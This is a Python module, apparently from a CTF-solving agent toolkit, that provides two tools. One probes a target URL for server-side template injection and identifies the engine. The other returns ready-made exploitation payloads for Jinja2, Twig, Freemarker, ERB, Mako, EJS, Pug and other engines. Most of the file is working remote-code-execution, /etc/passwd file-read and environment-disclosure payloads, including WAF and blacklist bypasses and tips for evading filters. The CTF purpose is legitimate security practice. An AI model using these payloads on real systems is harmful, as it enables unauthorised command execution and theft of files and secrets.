"""
SSTI (Server-Side Template Injection) detection tools for CTF solving.

Provides utilities for detecting and exploiting template injection vulnerabilities
across 16+ template engines including Nunjucks, Pug, Tera, Go templates, and EJS.
"""

from typing import Dict, List, Optional, Tuple

import requests

from ctf_solver.tools.core import parse_json_input


class SstiProbeTool:
    """
    SstiProbeTool: detect Server-Side Template Injection vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/page",
          "method": "GET",                  # or "POST"
          "param": "name",                  # parameter to test
          "data": {"other": "value"},       # optional extra form data
          "headers": {"Cookie": "..."},     # optional headers
          "timeout": 10                     # optional timeout in seconds
        }

    The tool injects various template syntax probes and analyzes responses
    to detect SSTI vulnerabilities and identify the template engine.
    """

    name: str = "ssti_probe"
    description: str = (
        "Detect Server-Side Template Injection (SSTI) vulnerabilities. Input must be JSON "
        "with 'url', 'method' (GET/POST), and 'param' (parameter to test). Optionally provide "
        "'data' for extra form fields and 'headers'. The tool injects template syntax probes "
        "and detects which template engine is vulnerable (Jinja2, Twig, Freemarker, ERB, Smarty, etc.)."
    )
    parameters_schema = {
        "type": "object",
        "properties": {
            "url": {"type": "string"},
            "method": {"type": "string", "enum": ["GET", "POST"]},
            "param": {"type": "string"},
            "data": {"type": "object"},
            "headers": {"type": "object"},
            "timeout": {"type": "integer", "default": 10},
        },
        "required": ["url", "method", "param"],
        "additionalProperties": False,
    }
    samples = [
        {
            "url": "http://example.com/greet",
            "method": "GET",
            "param": "name",
        }
    ]

    # Universal probes that work across multiple engines
    UNIVERSAL_PROBES = [
        # Mathematical expressions - should evaluate to a predictable result
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("#{7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("{{7*'7'}}", "7777777"),  # Jinja2/Twig string multiplication
        ("${7*'7'}", "7777777"),  # Some engines
        # Alternative syntax
        ("[[7*7]]", "49"),  # Some custom delimiters
        ("{%25 print 7*7 %25}", "49"),  # URL-encoded Jinja2
    ]

    # Engine-specific probes with unique signatures
    ENGINE_PROBES: Dict[str, List[Tuple[str, str, str]]] = {
        "jinja2": [
            ("{{config}}", "Config", "Jinja2 (Python Flask)"),
            ("{{self}}", "<TemplateReference", "Jinja2"),
            ("{{request}}", "Request", "Jinja2 (Flask)"),
            ("{{''.__class__}}", "str", "Jinja2 (Python)"),
            ("{{''.__class__.__mro__}}", "tuple", "Jinja2 (Python)"),
        ],
        "twig": [
            ("{{_self}}", "Template", "Twig (PHP)"),
            ("{{_self.env}}", "Environment", "Twig (PHP)"),
            ("{{app}}", "Application", "Twig (Symfony)"),
            ("{{dump()}}", "NULL", "Twig (PHP)"),
        ],
        "freemarker": [
            ("${.version}", ".", "Freemarker (Java)"),
            ("${.now}", "20", "Freemarker (Java)"),
            ("<#assign x=7*7>${x}", "49", "Freemarker (Java)"),
            (
                '${"freemarker.template.utility.Execute"?new()}',
                "Execute",
                "Freemarker (Java)",
            ),
        ],
        "erb": [
            ("<%= self %>", "#<", "ERB (Ruby)"),
            ("<%= 7.class %>", "Integer", "ERB (Ruby)"),
            ("<%= Dir.pwd %>", "/", "ERB (Ruby)"),
            ("<%= `id` %>", "uid=", "ERB (Ruby RCE)"),
        ],
        "smarty": [
            ("{$smarty.version}", ".", "Smarty (PHP)"),
            ("{php}echo 7*7;{/php}", "49", "Smarty (PHP) - old syntax"),
            ("{Smarty_Internal_Write_File}", "Smarty", "Smarty (PHP)"),
        ],
        "velocity": [
            ("#set($x=7*7)$x", "49", "Velocity (Java)"),
            ("$class.inspect('java.lang.Runtime')", "Runtime", "Velocity (Java)"),
        ],
        "pebble": [
            ("{{7*7}}", "49", "Pebble (Java)"),
            ("{{beans}}", "beans", "Pebble (Java)"),
        ],
        "mako": [
            ("${7*7}", "49", "Mako (Python)"),
            ("<%! import os %>${os.popen('id').read()}", "uid=", "Mako (Python RCE)"),
        ],
        "thymeleaf": [
            ("[[${7*7}]]", "49", "Thymeleaf (Java)"),
            ("[(${7*7})]", "49", "Thymeleaf (Java)"),
        ],
        "nunjucks": [
            ("{{7*7}}", "49", "Nunjucks (Node.js)"),
            ("{{range.constructor('return 7*7')()}}", "49", "Nunjucks (Node.js)"),
            ("{{range.constructor('return this')()}}", "object", "Nunjucks (Node.js)"),
        ],
        "pug": [
            ("#{7*7}", "49", "Pug (Node.js)"),
            ("!{7*7}", "49", "Pug unescaped (Node.js)"),
        ],
        "tera": [
            ("{{ 7 * 7 }}", "49", "Tera (Rust)"),
        ],
        "go_template": [
            ('{{printf "%d" 49}}', "49", "Go html/template"),
            ("{{7}}", "7", "Go html/template"),
        ],
        "ejs": [
            ("<%=7*7%>", "49", "EJS (Node.js)"),
        ],
    }

    # RCE exploit suggestions per engine
    RCE_EXPLOITS: Dict[str, List[str]] = {
        "jinja2": [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        ],
        "twig": [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{{app.request.server.get('DOCUMENT_ROOT')}}",
        ],
        "freemarker": [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            '${"freemarker.template.utility.Execute"?new()("id")}',
        ],
        "erb": [
            "<%= `id` %>",
            "<%= system('id') %>",
            "<%= IO.popen('id').read %>",
        ],
        "smarty": [
            "{system('id')}",
            "{Smarty_Internal_Write_File::writeFile('/tmp/pwned','test',self::clearConfig())}",
        ],
        "velocity": [
            '#set($e="")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")',
        ],
        "mako": [
            "<%! import os %>${os.popen('id').read()}",
            "${__import__('os').popen('id').read()}",
        ],
        "nunjucks": [
            '{{range.constructor(\'return global.process.mainModule.require("child_process").execSync("id")\')()}}',
        ],
        "pug": [
            "-var x = global.process.mainModule.require('child_process').execSync('id')\n=x",
        ],
        "ejs": [
            "<%=global.process.mainModule.require('child_process').execSync('id')%>",
        ],
    }

    def __init__(self, session: Optional[requests.Session] = None):
        self.session = session or requests.Session()

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        data, err = parse_json_input(tool_input, "SstiProbeTool")
        if err:
            return err
        url = data.get("url", "").strip()
        method = data.get("method", "GET").upper()
        param = data.get("param", "").strip()
        extra_data = data.get("data", {})
        headers = data.get("headers", {})
        timeout = data.get("timeout", 10)

        if not url:
            return "[SstiProbeTool] Error: 'url' is required."
        if not param:
            return "[SstiProbeTool] Error: 'param' is required."
        if method not in ["GET", "POST"]:
            return (
                f"[SstiProbeTool] Error: 'method' must be GET or POST, got '{method}'."
            )

        try:
            return self._probe_ssti(url, method, param, extra_data, headers, timeout)
        except requests.RequestException as e:
            return f"[SstiProbeTool] Request error: {e}"
        except Exception as e:
            return f"[SstiProbeTool] Error: {e}"

    def _make_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        extra_data: dict,
        headers: dict,
        timeout: int,
    ) -> requests.Response:
        """Make request with payload injected into parameter."""
        request_data = {param: payload, **extra_data}
        if method == "GET":
            return self.session.get(
                url, params=request_data, headers=headers, timeout=timeout
            )
        else:
            # Detect JSON content type
            content_type = ""
            for k, v in headers.items():
                if k.lower() == "content-type":
                    content_type = v.lower()
                    break
            if "application/json" in content_type:
                return self.session.post(
                    url, json=request_data, headers=headers, timeout=timeout
                )
            else:
                return self.session.post(
                    url, data=request_data, headers=headers, timeout=timeout
                )

    def _probe_ssti(
        self,
        url: str,
        method: str,
        param: str,
        extra_data: dict,
        headers: dict,
        timeout: int,
    ) -> str:
        """Probe for SSTI vulnerabilities."""
        results = []
        detected_engines = set()
        vulnerable = False

        results.append("[SstiProbeTool] SSTI Detection Scan")
        results.append("=" * 50)
        results.append(f"URL: {url}")
        results.append(f"Method: {method}")
        results.append(f"Parameter: {param}")
        results.append("")

        # Get baseline response
        try:
            baseline = self._make_request(
                url, method, param, "BASELINE_TEST", extra_data, headers, timeout
            )
            baseline_len = len(baseline.text)
        except Exception as e:
            results.append(f"[!] Could not get baseline response: {e}")
            baseline_len = 0

        # Test universal probes first
        results.append("=== Universal Probes ===")
        for probe, expected in self.UNIVERSAL_PROBES:
            try:
                resp = self._make_request(
                    url, method, param, probe, extra_data, headers, timeout
                )
                if expected in resp.text:
                    vulnerable = True
                    results.append(f"[+] VULNERABLE: {probe} => Found '{expected}'")
                elif probe in resp.text:
                    # Probe reflected but not executed
                    results.append(f"[-] Reflected (not executed): {probe}")
            except Exception as e:
                results.append(f"[!] Error testing {probe}: {e}")

        results.append("")

        # Test engine-specific probes
        results.append("=== Engine-Specific Probes ===")
        for engine, probes in self.ENGINE_PROBES.items():
            for probe, expected, engine_name in probes:
                try:
                    resp = self._make_request(
                        url, method, param, probe, extra_data, headers, timeout
                    )
                    if expected in resp.text:
                        vulnerable = True
                        detected_engines.add(engine)
                        results.append(
                            f"[+] {engine_name}: {probe} => Found '{expected}'"
                        )
                except Exception as e:
                    results.append(f"[!] Error probing {engine}: {e}")

        results.append("")

        # Error-based detection
        results.append("=== Error-Based Detection ===")
        error_probes = [
            ("{{", "Unclosed"),
            ("${", "Unclosed"),
            ("<%", "Unclosed"),
            ("{%", "Unclosed"),
            ("{{invalid.syntax.here}}", "Error"),
            ("${nonexistent}", "Error"),
        ]

        for probe, desc in error_probes:
            try:
                resp = self._make_request(
                    url, method, param, probe, extra_data, headers, timeout
                )
                # Look for error messages that might reveal template engine
                error_indicators = [
                    ("jinja", "Jinja2"),
                    ("twig", "Twig"),
                    ("freemarker", "Freemarker"),
                    ("smarty", "Smarty"),
                    ("velocity", "Velocity"),
                    ("thymeleaf", "Thymeleaf"),
                    ("pebble", "Pebble"),
                    ("mako", "Mako"),
                    ("TemplateError", "Template engine"),
                    ("TemplateSyntaxError", "Template engine"),
                    ("ParseException", "Template engine"),
                    ("UndefinedError", "Jinja2"),
                ]
                for indicator, engine in error_indicators:
                    if indicator.lower() in resp.text.lower():
                        detected_engines.add(engine.lower())
                        results.append(f"[+] Error reveals {engine}: {indicator}")
            except Exception as e:
                results.append(f"[!] Error probing {engine}: {e}")

        results.append("")

        # Summary
        results.append("=== Summary ===")
        if vulnerable:
            results.append("[!] SSTI VULNERABILITY DETECTED!")
            if detected_engines:
                results.append(f"[*] Likely engine(s): {', '.join(detected_engines)}")
        else:
            results.append("[-] No obvious SSTI vulnerability detected")
            results.append("[*] Consider trying different parameters or input points")

        # Provide exploit suggestions
        if detected_engines:
            results.append("")
            results.append("=== Suggested RCE Payloads ===")
            for engine in detected_engines:
                if engine in self.RCE_EXPLOITS:
                    results.append(f"\n--- {engine.upper()} ---")
                    for exploit in self.RCE_EXPLOITS[engine][
                        :2
                    ]:  # Limit to 2 per engine
                        results.append(f"  {exploit}")

        return "\n".join(results)


class SstiExploitSuggester:
    """
    SstiExploitSuggester: get RCE payloads for identified template engines.

    This tool provides specific exploitation payloads once an SSTI
    vulnerability has been confirmed and the engine identified.
    """

    name: str = "ssti_exploit_suggester"
    description: str = (
        "Get RCE payloads for Server-Side Template Injection. Input must be JSON with "
        "'engine' (template engine name like 'jinja2', 'twig', 'erb', etc.) and optionally "
        "'command' (command to execute, default 'id'). Returns ready-to-use exploitation "
        "payloads for the specified engine."
    )

    # Comprehensive RCE payloads per engine
    PAYLOADS: Dict[str, Dict[str, List[str]]] = {
        "jinja2": {
            "rce": [
                # Direct attribute access (no bracket indexing — works when [] is blocked)
                "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
                "{{joiner.__init__.__globals__.os.popen('{cmd}').read()}}",
                "{{namespace.__init__.__globals__.os.popen('{cmd}').read()}}",
                # Bracket indexing variants (when [] is allowed)
                "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
                "{{lipsum.__globals__['os'].popen('{cmd}').read()}}",
                # Via request object
                "{{request.application.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
                # Subclass chain (when direct globals access is filtered)
                "{{''.__class__.__mro__[2].__subclasses__()[40]('{cmd}').read()}}",
                # Loop-based WAF bypass
                "{{% for x in ().__class__.__base__.__subclasses__() %}}{{% if 'warning' in x.__name__ %}}{{x()._module.__builtins__['__import__']('os').popen('{cmd}').read()}}{{% endif %}}{{% endfor %}}",
                # Attr-filter bypass for keyword blacklists (split dangerous strings)
                "{{(cycler|attr('__in'~'it__')|attr('__glo'~'bals__')).os.popen('{cmd}').read()}}",
            ],
            "file_read": [
                "{{cycler.__init__.__globals__.os.popen('cat {file}').read()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('cat {file}').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('{file}').read()}}",
            ],
            "info": [
                "{{config}}",
                "{{config.items()}}",
                "{{request.environ}}",
                "{{''.__class__.__mro__}}",
            ],
        },
        "twig": {
            "rce": [
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('{cmd}')}}",
                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{cmd}')}}",
                "{{['{cmd}']|filter('system')}}",
                "{{['{cmd}']|filter('exec')}}",
                "{{['cat /etc/passwd']|filter('passthru')}}",
            ],
            "file_read": [
                "{{source('{file}')}}",
                "{{include('{file}')}}",
            ],
            "info": [
                "{{_self}}",
                "{{_self.env}}",
                "{{app}}",
            ],
        },
        "freemarker": {
            "rce": [
                '<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("{cmd}")}}',
                '${{"freemarker.template.utility.Execute"?new()("{cmd}")}}',
                "[#assign ex='freemarker.template.utility.Execute'?new()]${{ex('{cmd}')}}",
            ],
            "file_read": [
                '<#include "{file}">',
                "<#assign content = .data_model['freemarker.template.utility.ObjectConstructor']?new()><#assign file = content('java.io.FileReader', '{file}')><#assign scanner = content('java.util.Scanner', file)>${{scanner.useDelimiter('\\\\Z').next()}}",
            ],
            "info": [
                "${{.version}}",
                "${{.now}}",
                "${{.data_model}}",
            ],
        },
        "erb": {
            "rce": [
                "<%= `{cmd}` %>",
                "<%= system('{cmd}') %>",
                "<%= IO.popen('{cmd}').read %>",
                "<%= open('|{cmd}').read %>",
                "<%= exec('{cmd}') %>",
            ],
            "file_read": [
                "<%= File.read('{file}') %>",
                "<%= File.open('{file}').read %>",
                "<%= IO.read('{file}') %>",
            ],
            "info": [
                "<%= self %>",
                "<%= ENV %>",
                "<%= Dir.pwd %>",
            ],
        },
        "smarty": {
            "rce": [
                "{{system('{cmd}')}}",
                "{{exec('{cmd}')}}",
                "{{passthru('{cmd}')}}",
                "{{php}}system('{cmd}');{{/php}}",
            ],
            "file_read": [
                "{{file_get_contents('{file}')}}",
                "{{include file='{file}'}}",
            ],
            "info": [
                "{{$smarty.version}}",
                "{{$smarty.template}}",
            ],
        },
        "velocity": {
            "rce": [
                "#set($e='')$e.getClass().forName('java.lang.Runtime').getRuntime().exec('{cmd}')",
                "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('{cmd}'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
            ],
            "file_read": [
                "#set($file='')$file.getClass().forName('java.io.FileInputStream').getConstructor($file.getClass()).newInstance('{file}').read()",
            ],
            "info": [
                "$class.inspect('java.lang.Runtime')",
                "$class.type",
            ],
        },
        "mako": {
            "rce": [
                "<%! import os %>${{os.popen('{cmd}').read()}}",
                "${{__import__('os').popen('{cmd}').read()}}",
                "<%! import subprocess %>${{subprocess.check_output('{cmd}', shell=True)}}",
            ],
            "file_read": [
                "<%! import open %>${{open('{file}').read()}}",
                "${{__builtins__.open('{file}').read()}}",
            ],
            "info": [
                "${{dir()}}",
                "${{self.module.__dict__}}",
            ],
        },
        "thymeleaf": {
            "rce": [
                "__${{T(java.lang.Runtime).getRuntime().exec('{cmd}')}}__::.",
                "*{{T(java.lang.Runtime).getRuntime().exec('{cmd}')}}",
            ],
            "file_read": [
                "__${{new java.util.Scanner(new java.io.File('{file}')).useDelimiter('\\\\Z').next()}}__::.",
            ],
            "info": [
                "[[${{'test'}}]]",
                "*{{'test'}}",
            ],
        },
        "pebble": {
            "rce": [
                "{{% set cmd = 'java.lang.Runtime' %}}{{% set runtime = beans.get(cmd).getRuntime() %}}{{% set process = runtime.exec('{cmd}') %}}{{process.getInputStream()}}",
                "{{['java.lang.Runtime'].getRuntime().exec('{cmd}')}}",
            ],
            "info": [
                "{{beans}}",
                "{{request}}",
            ],
        },
        "hubspot_hubl": {
            "rce": [
                "{{{{request.getClass().forName('java.lang.Runtime').getRuntime().exec('{cmd}')}}}}",
            ],
            "file_read": [
                "{{{{request.getClass().forName('java.util.Scanner').newInstance(request.getClass().forName('java.io.FileInputStream').newInstance('{file}')).useDelimiter('\\\\Z').next()}}}}",
            ],
            "info": [
                "{{request.getClass()}}",
                "{{request.getClass().getMethods()}}",
            ],
        },
        "nunjucks": {
            "rce": [
                "{{% set proc = global.process %}}{{% set spawn = proc.mainModule.require('child_process').execSync %}}{{{{spawn('{cmd}')}}}}",
                '{{{{range.constructor(\'return global.process.mainModule.require("child_process").execSync("{cmd}")\')()}}}}',
            ],
            "info": [
                "{{range.constructor('return this')()}}",
                "{{range.constructor('return global')()}}",
            ],
        },
        "handlebars": {
            "rce": [
                '{{{{#with "s" as |string|}}}}{{{{#with "e"}}}}{{{{#with split as |conslist|}}}}{{{{this.pop}}}}{{{{this.push (lookup string.sub "constructor")}}}}{{{{this.pop}}}}{{{{#with string.split as |codelist|}}}}{{{{this.pop}}}}{{{{this.push "return require(\'child_process\').execSync(\'{cmd}\')"}}}}{{{{this.pop}}}}{{{{#each conslist}}}}{{{{#with (string.sub.apply 0 codelist)}}}}{{{{this}}}}{{{{/with}}}}{{{{/each}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}{{{{/with}}}}',
            ],
            "info": [
                "{{this}}",
                "{{this.constructor}}",
            ],
        },
        "pug": {
            "rce": [
                "-var x = global.process.mainModule.require('child_process').execSync('{cmd}')\n={{x}}",
                "- var require = global.process.mainModule.require\n- var exec = require('child_process').execSync\n= exec('{cmd}')",
            ],
            "file_read": [
                "- var fs = global.process.mainModule.require('fs')\n= fs.readFileSync('{file}', 'utf8')",
            ],
            "info": [
                "#{process.env}",
                "#{process.cwd()}",
                "#{JSON.stringify(process.env)}",
            ],
        },
        "tera": {
            "info": [
                "{{{{ get_env(name='PATH') }}}}",
                "{{{{ get_env(name='FLAG') }}}}",
                "{{{{ get_env(name='HOME') }}}}",
            ],
        },
        "go_template": {
            "file_read": [
                "{{{{.}}}}",
                '{{{{$f := "/etc/passwd"}}}}{{{{$f}}}}',
            ],
            "info": [
                "{{{{.}}}}",
                '{{{{printf "%v" .}}}}',
            ],
        },
        "ejs": {
            "rce": [
                "<%=global.process.mainModule.require('child_process').execSync('{cmd}')%>",
                "<%- global.process.mainModule.require('child_process').execSync('{cmd}') %>",
            ],
            "file_read": [
                "<%=global.process.mainModule.require('fs').readFileSync('{file}','utf8')%>",
            ],
            "info": [
                "<%=process.env%>",
                "<%=process.cwd()%>",
                "<%=JSON.stringify(process.env)%>",
            ],
        },
    }

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        data, err = parse_json_input(tool_input, "SstiExploitSuggester")
        if err:
            return err
        engine = data.get("engine", "").lower().strip()
        command = data.get("command", "id")
        file_path = data.get("file", "/etc/passwd")

        if not engine:
            engines = ", ".join(sorted(self.PAYLOADS.keys()))
            return f"[SstiExploitSuggester] Error: 'engine' is required. Supported: {engines}"

        if engine not in self.PAYLOADS:
            engines = ", ".join(sorted(self.PAYLOADS.keys()))
            return (
                f"[SstiExploitSuggester] Error: Unknown engine '{engine}'. "
                f"Supported: {engines}"
            )

        engine_payloads = self.PAYLOADS[engine]

        result = [f"[SstiExploitSuggester] Payloads for {engine.upper()}"]
        result.append("=" * 50)
        result.append("")

        # RCE payloads
        if "rce" in engine_payloads:
            result.append(f"=== RCE Payloads (command: {command}) ===")
            for payload in engine_payloads["rce"]:
                formatted = payload.replace("{cmd}", command)
                result.append(formatted)
            result.append("")

        # File read payloads
        if "file_read" in engine_payloads:
            result.append(f"=== File Read Payloads (file: {file_path}) ===")
            for payload in engine_payloads["file_read"]:
                formatted = payload.replace("{file}", file_path)
                result.append(formatted)
            result.append("")

        # Info payloads
        if "info" in engine_payloads:
            result.append("=== Information Disclosure ===")
            for payload in engine_payloads["info"]:
                result.append(payload)
            result.append("")

        # Tips
        result.append("=== Tips ===")
        result.append("1. If payloads are filtered, try URL encoding")
        result.append("2. Try different quote types (' vs \")")
        result.append("3. For blind SSTI, use sleep/delay commands")
        result.append("4. Check for WAF bypass techniques")

        return "\n".join(result)
